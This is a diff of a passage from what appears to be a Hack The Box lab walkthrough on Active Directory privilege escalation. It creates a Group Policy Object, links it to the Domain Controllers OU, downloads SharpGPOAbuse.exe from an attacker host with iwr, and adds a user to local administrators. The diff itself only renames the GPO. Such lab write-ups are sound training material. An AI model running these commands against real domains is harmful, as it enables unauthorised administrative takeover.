@@ -4,14 +4,14 @@ Create a new GPO with built in powershell commands
 
 
 ```
-New-GPO -Name "blnkn"
+New-GPO -Name "anything"
 ```
 
 
 Add a GPLink to the domain controllers OU
 
 ```
-New-GPLink -Name "blnkn" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
+New-GPLink -Name "anything" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
 ```
 
 
@@ -23,7 +23,7 @@ iwr "http://10.10.16.71:9090/SharpGPOAbuse.exe" -OutFile ./SharpGPOAbuse.exe
 Add m.schoolbus to localadmin group
 
 ```
-.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName blnkn
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName anything
 ```
 
 
